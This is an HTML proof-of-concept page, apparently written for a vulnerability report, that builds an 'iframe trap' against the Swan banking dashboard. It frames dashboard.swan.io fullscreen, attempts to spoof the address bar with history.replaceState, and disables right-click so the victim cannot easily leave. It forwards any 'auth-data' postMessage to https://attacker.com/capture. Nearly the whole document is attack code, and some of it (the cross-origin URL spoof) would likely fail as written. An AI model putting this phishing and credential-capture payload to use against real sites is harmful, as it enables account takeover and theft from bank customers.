<!DOCTYPE html>
<html>
<head>
    <title>Swan Iframe Trap PoC</title>
    <style>
        #trap-iframe {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 9999;
        }
    </style>
</head>
<body>
    <h1>Swan Iframe Trap Attack</h1>
    <button onclick="activateTrap()">Activate Iframe Trap</button>
    
    <script>
        function activateTrap() {
            // Create fullscreen iframe
            const iframe = document.createElement('iframe');
            iframe.id = 'trap-iframe';
            iframe.src = 'https://dashboard.swan.io/';
            
            // Monitor iframe navigation
            iframe.onload = function() {
                try {
                    // Try to access iframe content (will fail due to same-origin policy)
                    console.log('Iframe loaded:', iframe.contentWindow.location.href);
                } catch (e) {
                    console.log('Same-origin policy blocking access');
                }
                
                // Update browser URL to match iframe
                try {
                    window.history.replaceState({}, '', 'https://dashboard.swan.io/');
                } catch (e) {
                    console.log('Cannot update browser URL');
                }
            };
            
            // Add to page
            document.body.appendChild(iframe);
            
            // Monitor for navigation events
            window.addEventListener('message', function(event) {
                if (event.origin === 'https://dashboard.swan.io') {
                    console.log('Received message from Swan:', event.data);
                    
                    // Try to capture authentication data
                    if (event.data.type === 'auth-data') {
                        fetch('https://attacker.com/capture', {
                            method: 'POST',
                            body: JSON.stringify(event.data),
                            mode: 'no-cors'
                        });
                    }
                }
            });
        }
        
        // Disable right-click to prevent easy escape
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });
        
        // Monitor mouse leaving iframe (potential reload attempt)
        document.addEventListener('mouseleave', function() {
            window.history.replaceState({}, '', 'https://snowgoose.info/?trapped=true');
        });
    </script>
</body>
</html>
